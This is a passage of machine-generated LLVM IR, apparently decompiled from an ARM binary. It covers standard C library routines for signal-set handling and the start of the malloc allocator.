  %v1_12328 = phi i32 [ %v0_122fc, %entry ], [ -1, %dec_label_pc_1230c ]
  %v2_12324 = phi i32 [ %v3_122f0, %entry ], [ %v2_12324.pre, %dec_label_pc_1230c ]
  store i32 %v2_12324, i32* @r7, align 4
  ret i32 %v1_12328

; uselistorder directives
  uselistorder i32 %v0_122fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12324, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1232c:
  %v0_1232c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1232c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1232c
  %v3_12330 = call i32 @__libc_errno()
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1232c, %bb
  %v4_12330 = phi i32 [ %arg1, %dec_label_pc_1232c ], [ %v3_12330, %bb ]
  ret i32 %v4_12330

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_1234c, label %dec_label_pc_12344

dec_label_pc_12344:                               ; preds = %entry
  %v7_12348 = icmp slt i32 %arg2, 65
  br i1 %v7_12348, label %dec_label_pc_12368, label %dec_label_pc_1234c

dec_label_pc_1234c:                               ; preds = %dec_label_pc_12344, %entry
  %v0_12350 = call i32 @__aeabi_read_tp()
  %v3_12354 = load i16, i16* @global_var_22294.357, align 2
  %v4_12354 = sext i16 %v3_12354 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12360 = add i32 %v4_12354, %v0_12350
  %v4_12360 = inttoptr i32 %v3_12360 to i32*
  store i32 22, i32* %v4_12360, align 4
  %v0_12370.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12370

dec_label_pc_12368:                               ; preds = %dec_label_pc_12344
  %v0_12368 = call i32 @__sigaddset()
  store i32 %v0_12368, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12370

dec_label_pc_12370:                               ; preds = %dec_label_pc_1234c, %dec_label_pc_12368
  %v0_12370 = phi i32 [ %v0_12370.pre, %dec_label_pc_1234c ], [ %v0_12368, %dec_label_pc_12368 ]
  ret i32 %v0_12370

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12370, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1238c = add i32 %tmp, 4
  %v3_1238c = inttoptr i32 %v2_1238c to i32*
  store i32 0, i32* %v3_1238c, align 4
  %v1_12390 = load i32, i32* %r3.global-to-local, align 4
  %v2_12390 = inttoptr i32 %v1_12390 to i32*
  store i32 0, i32* %v2_12390, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12398 = load i32, i32* @r4, align 4
  store i32 %v3_12398, i32* %stack_var_-16, align 4
  %v6_12398 = load i32, i32* @r5, align 4
  %v9_12398 = load i32, i32* @r6, align 4
  %v7_123a0 = icmp eq i32 %arg2, -1
  br i1 %v7_123a0, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_123a8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_123c4

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_123cc

dec_label_pc_123c4:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r6, align 4
  %v7_123c8 = icmp slt i32 %arg1, 65
  br i1 %v7_123c8, label %dec_label_pc_123e8, label %dec_label_pc_123cc

dec_label_pc_123cc:                               ; preds = %.thread16, %dec_label_pc_123c4
  %v0_123d0 = call i32 @__aeabi_read_tp()
  %v3_123d4 = load i16, i16* @global_var_22294.357, align 2
  %v4_123d4 = sext i16 %v3_123d4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_123e0 = add i32 %v4_123d4, %v0_123d0
  %v4_123e0 = inttoptr i32 %v3_123e0 to i32*
  store i32 22, i32* %v4_123e0, align 4
  %v0_12440.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_123e8:                               ; preds = %dec_label_pc_123c4
  %v2_123e8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_123e8, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_123f0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_123f0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_12400 = call i32 @__sigaddset()
  %v0_12408 = load i32, i32* @r5, align 4
  store i32 %v0_12408, i32* %r1.global-to-local, align 4
  %v0_1240c = load i32, i32* @r6, align 4
  %v2_1240c = add i32 %v0_1240c, 11920
  %v2_12410 = call i32 @__GI___sigismember(i32 %v2_1240c, i32 %v0_12408)
  store i32 %v2_123e8, i32* %r1.global-to-local, align 4
  %v0_12424 = load i32, i32* @r5, align 4
  %v3_12430 = call i32 @__libc_sigaction(i32 %v0_12424, i32 %v2_123e8, i32 %v2_123a8)
  %v1_12434 = icmp slt i32 %v3_12430, 0
  br i1 %v1_12434, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_123e8
  %v5_12438 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_12438, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_123e8
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_123cc, %bb32
  %v0_12440 = phi i32 [ %v5_12438, %bb31 ], [ %v0_12440.pre, %dec_label_pc_123cc ], [ -1, %bb32 ]
  %v2_12448 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12448, i32* @r4, align 4
  store i32 %v6_12398, i32* @r5, align 4
  store i32 %v9_12398, i32* @r6, align 4
  ret i32 %v0_12440

; uselistorder directives
  uselistorder i32 %v2_123e8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123cc, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1245c = add i32 %arg2, -1
  %v3_12460 = udiv i32 %v1_1245c, 32
  %v4_12464 = mul nuw nsw i32 %v3_12460, 4
  %v5_12464 = add i32 %v4_12464, %arg1
  %v6_12464 = inttoptr i32 %v5_12464 to i32*
  %v7_12464 = load i32, i32* %v6_12464, align 4
  %v1_12468 = urem i32 %v1_1245c, 32
  %v7_12470 = shl i32 1, %v1_12468
  %v8_12470 = and i32 %v7_12464, %v7_12470
  %v10_12470 = icmp ne i32 %v8_12470, 0
  %. = zext i1 %v10_12470 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1245c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_12480 = load i32, i32* @r1, align 4
  %v1_12480 = add i32 %v0_12480, -1
  %v3_12484 = udiv i32 %v1_12480, 32
  %v0_12488 = load i32, i32* @r0, align 4
  %v4_12488 = mul nuw nsw i32 %v3_12484, 4
  %v5_12488 = add i32 %v0_12488, %v4_12488
  %v6_12488 = inttoptr i32 %v5_12488 to i32*
  %v7_12488 = load i32, i32* %v6_12488, align 4
  %v1_1248c = urem i32 %v1_12480, 32
  %v7_12494 = shl i32 1, %v1_1248c
  %v8_12494 = or i32 %v7_12488, %v7_12494
  store i32 %v8_12494, i32* %v6_12488, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12480, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_124a4 = add i32 %arg2, -1
  %v3_124a8 = udiv i32 %v1_124a4, 32
  %v4_124ac = mul nuw nsw i32 %v3_124a8, 4
  %v5_124ac = add i32 %v4_124ac, %arg1
  %v6_124ac = inttoptr i32 %v5_124ac to i32*
  %v7_124ac = load i32, i32* %v6_124ac, align 4
  %v1_124b0 = urem i32 %v1_124a4, 32
  %tmp = shl i32 -1, %v1_124b0
  %v8_124b8 = add i32 %tmp, -1
  %v9_124b8 = and i32 %v7_124ac, %v8_124b8
  store i32 %v9_124b8, i32* %v6_124ac, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_124a4, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_124c8 = udiv i32 %arg1, 256
  store i32 %v3_124c8, i32* %r1.global-to-local, align 4
  %v2_124cc = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_124cc, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_124d8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_124cc, i32 %v0_124d8)
  %v0_124dc = load i32, i32* %r1.global-to-local, align 4
  %v1_124dc = add i32 %v0_124dc, 1048320
  %v3_124e0 = udiv i32 %v1_124dc, 65536
  %v1_124e4 = and i32 %v3_124e0, 8
  %v6_124e8 = shl i32 %v0_124dc, %v1_124e4
  %v1_124ec = add i32 %v6_124e8, 520192
  %v3_124f0 = udiv i32 %v1_124ec, 65536
  %v1_124f4 = and i32 %v3_124f0, 4
  %v6_124f8 = shl i32 %v6_124e8, %v1_124f4
  %v1_124fc = add i32 %v6_124f8, 245760
  %v3_12500 = udiv i32 %v1_124fc, 65536
  %v1_12504 = and i32 %v3_12500, 2
  %v6_12508 = shl i32 %v6_124f8, %v1_12504
  store i32 %v6_12508, i32* %r1.global-to-local, align 4
  %v1_1250c = sub nsw i32 13, %v1_124e4
  %v2_12510 = sub nsw i32 %v1_1250c, %v1_124f4
  %v3_12514 = udiv i32 %v6_12508, 32768
  %v4_12514 = sub nuw nsw i32 -1, %v3_12514
  %v4_12518 = udiv i32 %v6_12508, 16384
  %v5_12518 = and i32 %v4_12518, %v4_12514
  %v2_1251c = sub nsw i32 %v2_12510, %v1_12504
  %v2_12520 = add nsw i32 %v2_1251c, %v5_12518
  %v1_12524 = add nsw i32 %v2_12520, 6
  %v0_12528 = load i32, i32* %ip.global-to-local, align 4
  %v6_12528 = lshr i32 %v0_12528, %v1_12524
  %v3_1252c = mul nsw i32 %v2_12520, 4
  %v1_12530 = add nsw i32 %v3_1252c, 32
  %v1_12534 = urem i32 %v6_12528, 4
  %v2_12538 = or i32 %v1_12534, %v1_12530
  ret i32 %v2_12538

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12540 = load i32, i32* @r4, align 4
  %v6_12540 = load i32, i32* @r5, align 4
  %v9_12540 = load i32, i32* @r6, align 4
  %v12_12540 = load i32, i32* @r7, align 4
  %v15_12540 = load i32, i32* @r8, align 4
  %v18_12540 = load i32, i32* @sb, align 4
  %v21_12540 = load i32, i32* @sl, align 4
  %v24_12540 = load i32, i32* @fp, align 4
  %v27_12540 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r1.global-to-local, align 4
  %v4_12554 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 108) to i32*), align 4
  store i32 %v4_12554, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_12560 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 68) to i32*), align 4
  store i32 %v4_12560, i32* %r1.global-to-local, align 4
  %v0_12564 = load i32, i32* @r0, align 4
  store i32 %v0_12564, i32* @r5, align 4
  store i32 %v4_12554, i32* %r2.global-to-local, align 4
  %v2_1256c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1256c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %ip.global-to-local, align 4
  %v4_12578 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), align 4
  store i32 %v4_12578, i32* %ip.global-to-local, align 4
  store i32 75140, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12578)
  %v0_12584 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12584, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r1, align 4
  %v4_12590 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 16) to i32*), align 4
  store i32 %v4_12590, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1259c.453 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12590)
  %v0_1259c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1259c, -32
  br i1 %tmp, label %dec_label_pc_125c0, label %dec_label_pc_125a4

dec_label_pc_125a4:                               ; preds = %entry
  store i32 64736, i32* %r2.global-to-local, align 4
  %v0_125a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_125a8, i32* %r0.global-to-local, align 4
  %v3_125ac = load i16, i16* @global_var_22294.357, align 2
  %v4_125ac = sext i16 %v3_125ac to i32
  store i32 %v4_125ac, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_125b8 = add i32 %v4_125ac, %v0_125a8
  %v4_125b8 = inttoptr i32 %v3_125b8 to i32*
  store i32 12, i32* %v4_125b8, align 4
  br label %dec_label_pc_12e44

dec_label_pc_125c0:                               ; preds = %entry
  %v1_125c0 = add i32 %v0_1259c, 11
  store i32 %v1_125c0, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v2_125cc = icmp ugt i32 %v1_125c0, 14
  %v7_125cc = icmp eq i32 %v1_125c0, 15
  %v2_125d0 = xor i1 %v7_125cc, true
  %v3_125d0 = and i1 %v2_125cc, %v2_125d0
  br i1 %v3_125d0, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_125c0
  %v5_125d0 = and i32 %v1_125c0, -8
  store i32 %v5_125d0, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_125c0, %bb
  %v4_125d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_125d4, i32* @r0, align 4
  %v1_125d8 = inttoptr i32 %v4_125d4 to i32*
  %v2_125d8 = load i32, i32* %v1_125d8, align 4
  store i32 %v2_125d8, i32* @r4, align 4
  %v2_125dc = xor i1 %v2_125cc, true
  %v3_125dc = or i1 %v7_125cc, %v2_125dc
  br i1 %v3_125dc, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_125e0 = urem i32 %v2_125d8, 2
  %v2_125e0 = icmp eq i32 %v1_125e0, 0
  br i1 %v2_125e0, label %dec_label_pc_125e8, label %dec_label_pc_125f8

dec_label_pc_125e8:                               ; preds = %bb143
  %v2_125e8 = icmp eq i32 %v2_125d8, 0
  br i1 %v2_125e8, label %dec_label_pc_125f0, label %dec_label_pc_129d4

dec_label_pc_125f0:                               ; preds = %dec_label_pc_125e8
  %v0_125f0 = call i32 @__malloc_consolidate()
  store i32 %v0_125f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129d4

dec_label_pc_125f8:                               ; preds = %bb143
  %v0_125f8 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_125f8, %v2_125d8
  br i1 %tmp204, label %dec_label_pc_12620, label %dec_label_pc_12600

dec_label_pc_12600:                               ; preds = %dec_label_pc_125f8
  %v1_12600 = add i32 %v4_125d4, -4
  store i32 %v1_12600, i32* %r1.global-to-local, align 4
  %v3_12604 = udiv i32 %v0_125f8, 8
  store i32 %v3_12604, i32* %r2.global-to-local, align 4
  %v4_12608 = mul nuw i32 %v3_12604, 4
  %v5_12608 = add i32 %v4_12608, %v1_12600
  %v6_12608 = inttoptr i32 %v5_12608 to i32*
  %v7_12608 = load i32, i32* %v6_12608, align 4
  store i32 %v7_12608, i32* %r0.global-to-local, align 4
  %v2_1260c = icmp eq i32 %v7_12608, 0
  br i1 %v2_1260c, label %dec_label_pc_12620, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12600
  %v2_12610 = add i32 %v7_12608, 8
  %v3_12610 = inttoptr i32 %v2_12610 to i32*
  %v4_12610 = load i32, i32* %v3_12610, align 4
  store i32 %v4_12610, i32* %r3.global-to-local, align 4
  store i32 %v2_12610, i32* %r0.global-to-local, align 4
  store i32 %v2_12610, i32* %r4.global-to-local, align 4
  store i32 %v4_12610, i32* %v6_12608, align 4
  br label %dec_label_pc_12e28

dec_label_pc_12620:                               ; preds = %dec_label_pc_12600, %dec_label_pc_125f8
  %tmp205 = icmp ugt i32 %v0_125f8, 255
  br i1 %tmp205, label %dec_label_pc_12670, label %dec_label_pc_12628

dec_label_pc_12628:                               ; preds = %dec_label_pc_12620
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12630 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  %v3_12634 = udiv i32 %v0_125f8, 8
  store i32 %v3_12634, i32* @r7, align 4
  %v4_12638 = mul nuw i32 %v3_12634, 8
  %v5_12638 = add i32 %v4_12630, %v4_12638
  store i32 %v5_12638, i32* %r3.global-to-local, align 4
  %v1_1263c = add i32 %v5_12638, 44
  store i32 %v1_1263c, i32* %ip.global-to-local, align 4
  %v1_12640 = add i32 %v5_12638, 56
  %v2_12640 = inttoptr i32 %v1_12640 to i32*
  %v3_12640 = load i32, i32* %v2_12640, align 4
  store i32 %v3_12640, i32* %r0.global-to-local, align 4
  %v9_12644 = icmp eq i32 %v3_12640, %v1_1263c
  br i1 %v9_12644, label %dec_label_pc_127d0, label %dec_label_pc_1264c

dec_label_pc_1264c:                               ; preds = %dec_label_pc_12628
  %v2_1264c = add i32 %v3_12640, %v0_125f8
  store i32 %v2_1264c, i32* %r3.global-to-local, align 4
  %v1_12650 = add i32 %v2_1264c, 4
  %v2_12650 = inttoptr i32 %v1_12650 to i32*
  %v3_12650 = load i32, i32* %v2_12650, align 4
  store i32 %v3_12650, i32* %r2.global-to-local, align 4
  %v1_12654 = add i32 %v3_12640, 12
  %v2_12654 = inttoptr i32 %v1_12654 to i32*
  %v3_12654 = load i32, i32* %v2_12654, align 4
  store i32 %v3_12654, i32* %r1.global-to-local, align 4
  %v1_12658 = or i32 %v3_12650, 1
  store i32 %v1_12658, i32* %r2.global-to-local, align 4
  %v1_1265c = add i32 %v3_12640, 8
  store i32 %v1_1265c, i32* %r4.global-to-local, align 4
  store i32 %v1_12658, i32* %v2_12650, align 4
  %v0_12664 = load i32, i32* %ip.global-to-local, align 4
  %v1_12664 = load i32, i32* %r1.global-to-local, align 4
  %v2_12664 = add i32 %v1_12664, 8
  %v3_12664 = inttoptr i32 %v2_12664 to i32*
  store i32 %v0_12664, i32* %v3_12664, align 4
  %v0_12668 = load i32, i32* %r1.global-to-local, align 4
  %v1_12668 = load i32, i32* %ip.global-to-local, align 4
  %v2_12668 = add i32 %v1_12668, 12
  %v3_12668 = inttoptr i32 %v2_12668 to i32*
  store i32 %v0_12668, i32* %v3_12668, align 4
  br label %dec_label_pc_12e28

dec_label_pc_12670:                               ; preds = %dec_label_pc_12620
  store i32 %v0_125f8, i32* %r0.global-to-local, align 4
  %v1_12674 = call i32 @__malloc_largebin_index(i32 %v0_125f8)
  store i32 %v1_12674, i32* %r0.global-to-local, align 4
  %v0_12678 = load i32, i32* @r4, align 4
  %v1_12678 = and i32 %v0_12678, 2
  %v2_12678 = icmp eq i32 %v1_12678, 0
  store i32 %v1_12674, i32* @r7, align 4
  br i1 %v2_12678, label %dec_label_pc_127d0, label %dec_label_pc_12684

dec_label_pc_12684:                               ; preds = %dec_label_pc_12670
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r1.global-to-local, align 4
  %v4_1268c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_1268c, i32* @r0, align 4
  %v0_12690 = call i32 @__malloc_consolidate()
  store i32 %v0_12690, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_127d0

dec_label_pc_12698:                               ; preds = %dec_label_pc_127e4
  %v1_12698 = add i32 %v3_127e4, 4
  %v2_12698 = inttoptr i32 %v1_12698 to i32*
  %v3_12698 = load i32, i32* %v2_12698, align 4
  store i32 %v3_12698, i32* %r3.global-to-local, align 4
  %v0_1269c = load i32, i32* @sl, align 4
  %v1_126a0 = and i32 %v3_12698, -4
  store i32 %v1_126a0, i32* %r4.global-to-local, align 4
  %v1_126a4 = add i32 %v3_127e4, 12
  %v2_126a4 = inttoptr i32 %v1_126a4 to i32*
  %v3_126a4 = load i32, i32* %v2_126a4, align 4
  store i32 %v3_126a4, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_1269c, 255
  br i1 %tmp206, label %dec_label_pc_12700, label %dec_label_pc_126ac

dec_label_pc_126ac:                               ; preds = %dec_label_pc_12698
  %v9_126ac = icmp eq i32 %v3_126a4, %v0_12704
  br i1 %v9_126ac, label %dec_label_pc_126b4, label %dec_label_pc_12700

dec_label_pc_126b4:                               ; preds = %dec_label_pc_126ac
  %v0_126b4 = load i32, i32* @sb, align 4
  %v1_126b4 = add i32 %v0_126b4, 48
  %v2_126b4 = inttoptr i32 %v1_126b4 to i32*
  %v3_126b4 = load i32, i32* %v2_126b4, align 4
  store i32 %v3_126b4, i32* %r3.global-to-local, align 4
  %v9_126b8 = icmp eq i32 %v3_127e4, %v3_126b4
  br i1 %v9_126b8, label %dec_label_pc_126c0, label %dec_label_pc_12700

dec_label_pc_126c0:                               ; preds = %dec_label_pc_126b4
  %v1_126c0 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_126a0, %v1_126c0
  br i1 %tmp207, label %dec_label_pc_126c8, label %dec_label_pc_12700

dec_label_pc_126c8:                               ; preds = %dec_label_pc_126c0
  %v2_126c8 = sub i32 %v1_126a0, %v0_1269c
  store i32 %v2_126c8, i32* %r2.global-to-local, align 4
  %v2_126cc = add i32 %v0_1269c, %v3_127e4
  store i32 %v2_126cc, i32* %r3.global-to-local, align 4
  %v1_126d0 = or i32 %v0_1269c, 1
  store i32 %v1_126d0, i32* %r0.global-to-local, align 4
  %v1_126d4 = or i32 %v2_126c8, 1
  store i32 %v1_126d4, i32* %r1.global-to-local, align 4
  %v1_126d8 = add i32 %v3_127e4, 8
  store i32 %v1_126d8, i32* %r4.global-to-local, align 4
  %v2_126dc = add i32 %v0_12704, 8
  %v3_126dc = inttoptr i32 %v2_126dc to i32*
  store i32 %v2_126cc, i32* %v3_126dc, align 4
  %v0_126e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_126e0 = load i32, i32* %ip.global-to-local, align 4
  %v2_126e0 = add i32 %v1_126e0, 12
  %v3_126e0 = inttoptr i32 %v2_126e0 to i32*
  store i32 %v0_126e0, i32* %v3_126e0, align 4
  %v0_126e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_126e4 = load i32, i32* @r6, align 4
  %v2_126e4 = add i32 %v1_126e4, 4
  %v3_126e4 = inttoptr i32 %v2_126e4 to i32*
  store i32 %v0_126e4, i32* %v3_126e4, align 4
  %v0_126e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_126e8 = load i32, i32* @sb, align 4
  %v2_126e8 = add i32 %v1_126e8, 48
  %v3_126e8 = inttoptr i32 %v2_126e8 to i32*
  store i32 %v0_126e8, i32* %v3_126e8, align 4
  %v0_126ec = load i32, i32* %r2.global-to-local, align 4
  %v1_126ec = load i32, i32* %r3.global-to-local, align 4
  %v3_126ec = add i32 %v1_126ec, %v0_126ec
  %v4_126ec = inttoptr i32 %v3_126ec to i32*
  store i32 %v0_126ec, i32* %v4_126ec, align 4
  %v0_126f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_126f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_126f0 = add i32 %v1_126f0, 4
  %v3_126f0 = inttoptr i32 %v2_126f0 to i32*
  store i32 %v0_126f0, i32* %v3_126f0, align 4
  %v0_126f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_126f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_126f4 = add i32 %v1_126f4, 12
  %v3_126f4 = inttoptr i32 %v2_126f4 to i32*
  store i32 %v0_126f4, i32* %v3_126f4, align 4
  %v0_126f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_126f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_126f8 = add i32 %v1_126f8, 8
  %v3_126f8 = inttoptr i32 %v2_126f8 to i32*
  store i32 %v0_126f8, i32* %v3_126f8, align 4
  br label %dec_label_pc_12e28

dec_label_pc_12700:                               ; preds = %dec_label_pc_126c0, %dec_label_pc_126b4, %dec_label_pc_126ac, %dec_label_pc_12698
  %v9_12700 = icmp eq i32 %v1_126a0, %v0_1269c
  %v2_12704 = add i32 %v3_126a4, 8
  %v3_12704 = inttoptr i32 %v2_12704 to i32*
  store i32 %v0_12704, i32* %v3_12704, align 4
  %v0_12708 = load i32, i32* %ip.global-to-local, align 4
  %v1_12708 = load i32, i32* %r5.global-to-local, align 4
  %v2_12708 = add i32 %v1_12708, 12
  %v3_12708 = inttoptr i32 %v2_12708 to i32*
  store i32 %v0_12708, i32* %v3_12708, align 4
  br i1 %v9_12700, label %dec_label_pc_12860.loopexit, label %dec_label_pc_1271c

dec_label_pc_1271c:                               ; preds = %dec_label_pc_12700
  %v0_1271c = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_1271c, 255
  br i1 %tmp208, label %dec_label_pc_12740, label %dec_label_pc_12724

dec_label_pc_12724:                               ; preds = %dec_label_pc_1271c
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v1_12728 = load i32, i32* %r8.global-to-local, align 4
  %v2_12728 = add i32 %v1_12728, ptrtoint (i32* @global_var_2223c.361 to i32)
  %v3_12728 = inttoptr i32 %v2_12728 to i32*
  %v4_12728 = load i32, i32* %v3_12728, align 4
  %v3_1272c = udiv i32 %v0_1271c, 8
  store i32 %v3_1272c, i32* %r0.global-to-local, align 4
  %v4_12730 = mul nuw i32 %v3_1272c, 8
  %v5_12730 = add i32 %v4_12728, %v4_12730
  store i32 %v5_12730, i32* %r3.global-to-local, align 4
  %v1_12734 = add i32 %v5_12730, 44
  store i32 %v1_12734, i32* %ip.global-to-local, align 4
  %v1_12738 = add i32 %v5_12730, 52
  %v2_12738 = inttoptr i32 %v1_12738 to i32*
  %v3_12738 = load i32, i32* %v2_12738, align 4
  store i32 %v3_12738, i32* @lr, align 4
  br label %dec_label_pc_12798

dec_label_pc_12740:                               ; preds = %dec_label_pc_1271c
  store i32 %v0_1271c, i32* %r0.global-to-local, align 4
  %v1_12744 = call i32 @__malloc_largebin_index(i32 %v0_1271c)
  store i32 %v1_12744, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %ip.global-to-local, align 4
  %v1_1274c = load i32, i32* %r8.global-to-local, align 4
  %v2_1274c = add i32 %v1_1274c, ptrtoint (i32* @global_var_2223c.361 to i32)
